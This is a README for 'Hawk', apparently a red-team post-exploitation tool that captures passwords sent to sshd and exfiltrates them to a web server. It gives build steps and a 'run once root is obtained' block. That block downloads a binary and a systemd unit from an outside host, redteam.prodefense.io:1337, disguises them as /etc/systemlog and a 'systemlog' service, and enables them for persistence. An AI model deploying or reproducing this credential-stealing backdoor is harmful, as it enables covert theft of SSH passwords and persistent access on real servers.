# Hawk

This tool monitors sshd for passwords being sent to the server.

## Description

Hawk is a simple tool designed to monitor the sshd service for passwords being sent to the server. It includes a bash script for easy installation and a Go program for password exfiltration to a web server.

## Building for server

```bash
git clone https://github.com/MattKeeley/hawk.git &&
cd hawk


vim exfil.go and change the server location


go build -o hawk &&
cp hawk /home/ubuntu/webserver &&
cp hawk_backdoor /home/ubuntu/webserver
```

## Run once root is obtained:

```bash
 sudo ls /etc/systemlog || sudo wget http://redteam.prodefense.io:1337/hawk -O /etc/systemlog > /dev/null 2>&1
 sudo chmod +x /etc/systemlog
 sudo ls /etc/systemd/system/systemlog.service || sudo wget http://redteam.prodefense.io:1337/hawk_backdoor -O /etc/systemd/system/systemlog.service
 sudo systemctl start systemlog.service
 sudo systemctl enable systemlog.service
```

## For debugging to turn off

```bash
 sudo systemctl stop systemlog.service
 sudo systemctl disable systemlog.service
 sudo rm -rf /etc/systemd/system/systemlog.service
 sudo rm -rf /etc/systemlog
```
